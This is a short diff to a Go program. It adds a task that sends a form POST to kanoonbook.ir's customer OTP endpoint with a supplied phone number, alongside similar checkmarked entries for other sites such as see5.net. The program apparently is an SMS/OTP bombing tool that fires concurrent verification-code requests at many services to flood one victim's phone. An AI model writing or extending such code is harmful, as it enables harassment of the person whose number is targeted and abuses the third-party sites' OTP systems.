@@ -1724,6 +1724,17 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
+// --- kanoonbook.ir (POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("task", "customer_phone")
+        formData.Set("customer_username", phone)
+        sendFormRequest(c, ctx, "https://www.kanoonbook.ir/store/customer_otp", formData, &wg, ch)
+    }
+}(client)
+
 		// see5.net (Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
